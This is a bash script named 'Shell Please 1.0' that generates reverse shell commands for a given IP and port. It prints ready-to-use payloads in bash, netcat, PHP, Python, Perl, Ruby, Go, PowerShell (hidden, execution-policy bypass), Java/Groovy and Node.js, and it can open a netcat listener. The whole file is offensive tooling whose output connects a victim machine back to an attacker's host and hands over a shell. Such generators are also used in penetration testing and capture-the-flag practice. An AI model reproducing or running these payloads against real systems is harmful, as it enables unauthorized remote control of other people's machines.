#!/bin/bash
#Shell Please 1.0 : Reverse shell code generator.
#Author : Himanshu Shukla.
echo ""
echo "Shell Please 1.0 : Reverse Shell Code Generator"
echo "Author - Himanshu Shukla"
echo ""
echo "Use -h for help."
echo ""

basher() {
    echo "[ + ] Bash"
    echo ""
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo ""
    echo "0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
    echo ""
    echo ""
}

netcat() {
    echo "[ + ] Netcat Classic"
    echo ""
    echo "nc -e /bin/bash $ip $port"
    echo ""
    echo "nc -c bash $ip $port"
    echo ""
    echo "nc -e /bin/sh $ip $port"
    echo ""
    echo "[ + ] Netcat OpenBSD"
    echo ""
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
    echo ""
    echo ""
}

pphp() {
    echo "[ + ] PHP"
    echo ""
    echo "php -r '$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo "php -r '$sock=fsockopen(\"$ip\",$port);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo "php -r '$sock=fsockopen(\"$ip\",$port);\`/bin/sh -i <&3 >&3 2>&3\`;'"
    echo ""
    echo "php -r '$sock=fsockopen(\"$ip\",$port);system(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo "php -r '$sock=fsockopen(\"$ip\",$port);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo "php -r '$sock=fsockopen(\"$ip\",$port);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
    echo ""
    echo ""
}

pyth() {
    echo "[ + ] Python"
    echo ""
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
    echo ""
    echo "export RHOST="$ip";export RPORT=$port;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[ os.dup2(s.fileno(),fd) for fd in (0,1,2) ];pty.spawn(\"/bin/sh\")'"
    echo ""
    echo ""
}

perlo() {
    echo "[ + ] Perl"
    echo ""
    echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    echo ""
    echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    echo ""
    echo ""
}

rubi() {
    echo "[ + ] Ruby"
    echo ""
    echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    echo ""
    echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo ""
    echo ""
}

golang() {
    echo "[ + ] Golang"
    echo ""
    echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$ip:$port\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
    echo ""
    echo ""  
}

pshell() {
    echo "[ + ] Powershell"  
    echo ""
    echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    echo "" 
    echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex $\data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"" 
    echo "" 
    echo "" 
}
java_or_groovy() {
    echo "[ + ] Java/Groovy"
    echo ""
    echo "echo 'public class Shell {public static void main(String[] args) {try {Runtime r = Runtime.getRuntime();Process p = r.exec(new String[] {\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"});p.waitFor();} catch (Exception ex) {System.out.println(ex);}}}' > Shell.java && javac Shell.java && java Shell"
    echo ""
    echo "echo 'import java.net.Socket;import java.io.InputStream;import java.io.OutputStream;public class Shell {public static void main(String[] args) {try {String host=\"$ip\";int port=$port;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();} catch (Exception ex) {System.out.println(ex);}}}' > Shell.java && javac Shell.java && java Shell"
    echo ""
}
nodejs() {
    echo "[ + ] NodeJS"
    echo ""
    echo "echo 'global.process.mainModule.require(\"child_process\").spawn(\"/bin/bash\", [\"-c\", \"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"]);' > shell.js && node shell.js"
    echo ""
}
shells() {
    netcat
    basher
    pyth
    pphp
    perlo
    rubi
    golang
    pshell
    java_or_groovy
    nodejs
}

helper () {
    echo "Usage: shp -i <IP> -p <PORT> [ OPTIONS FLAG ]"
    echo ""
    echo "FLAG                            DESCRIPTION"
    echo "-i    Specify IP Address where you want the reverse shell to spawn."
    echo "-p    Specify Port Number where you want the reverse shell to spawn."
    echo "-a    Display all types of reverse shell commands."
    echo "-l    Start a netcat listener on specified port."
    echo "-t    Specify type of reverse shell command you want."
    echo ""
    echo "Here is the complete list of -t parameters :"
    echo "-t netcat"
    echo "-t bash"
    echo "-t python"
    echo "-t php"
    echo "-t perl"
    echo "-t ruby"
    echo "-t golang"
    echo "-t powershell"
    echo "-t java"
    echo "-t groovy"
    echo "-t nodejs"
    echo ""
    echo " Example Usage:"
    echo ""
    echo "  shp -i 10.10.7.1 -p 2222 -a"
}

typer() {

    if [ "$type" == "netcat" ]
    then
        netcat
    fi
    if [ "$type" == "bash" ]
    then
        basher
    fi
    if [ "$type" == "python" ]
    then
         pyth
    fi
    if [ "$type" == "php" ]
    then
        pphp
    fi
    if [ "$type" == "perl" ]
    then
        perlo
    fi
    if [ "$type" == "ruby" ]
    then
        rubi
    fi
    if [ "$type" == "golang" ]
    then
        golang
    fi
    if [ "$type" == "powershell" ]
    then
        pshell
    fi
    if [ "$type" == "java" ] || [ "$type" == "groovy" ]
    then
        java_or_groovy
    fi
    if [ "$type" == "nodejs" ]
    then
        nodejs
    fi

}

listener() {

    nc -lvnp $port
}

while getopts "i:p:t:alh" arg; do
  case $arg in
    i) ip=$OPTARG;;
    p) port=$OPTARG;;
    h) helper ;;
    a) shells ;;
    t) type=$OPTARG typer ;;
    l) listener ;;
  esac
done
